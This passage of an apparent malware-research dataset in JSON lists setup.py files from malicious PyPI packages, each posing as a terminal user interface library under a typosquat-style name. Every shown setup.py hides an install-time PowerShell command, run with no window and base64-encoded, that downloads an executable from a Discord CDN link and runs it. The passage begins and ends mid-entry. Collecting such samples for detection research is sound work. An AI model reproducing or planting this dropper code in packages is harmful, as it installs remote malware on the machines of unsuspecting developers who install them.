        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libnvidiasplitpep',\n    packages = ['modlib'],\n    version = '4.5',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libpipcontrolcandy-v10.30",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpipcontrolcandy',\n    packages = ['modlib'],\n    version = '6.6',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libponggetpaypal-v2.51",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libponggetpaypal',\n    packages = ['modlib'],\n    version = '2.99',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libpushmasklgtb-v6.91",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpushmaskLGTB',\n    packages = ['modlib'],\n    version = '6.32',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-librandlgtbultra-v6.97",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'librandLGTBultra',\n    packages = ['modlib'],\n    version = '10.94',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libstudyencodepaypal-v7.27",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libstudyencodepaypal',\n    packages = ['modlib'],\n    version = '3.28',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libvirtualreplacepyw-v9.34",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libvirtualreplacepyw',\n    packages = ['modlib'],\n    version = '6.60',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-adpongultra-v7.85",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-adpongultra',\n    packages = ['modlib'],\n    version = '6.51',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-adpywpong-v4.91",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-adpywpong',\n    packages = ['modlib'],\n    version = '1.93',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-candyhydrapep-v5.43",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-candyhydrapep',\n    packages = ['modlib'],\n    version = '9.61',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-candyintcontrol-v2.70",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-candyintcontrol',\n    packages = ['modlib'],\n    version = '10.24',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-candynvidiakill-v8.30",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-candynvidiakill',\n    packages = ['modlib'],\n    version = '1.55',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-controlgettool-v4.97",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-controlgettool',\n    packages = ['modlib'],\n    version = '5.62',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-controlgrandlib-v1.87",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-controlgrandlib',\n    packages = ['modlib'],\n    version = '5.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: 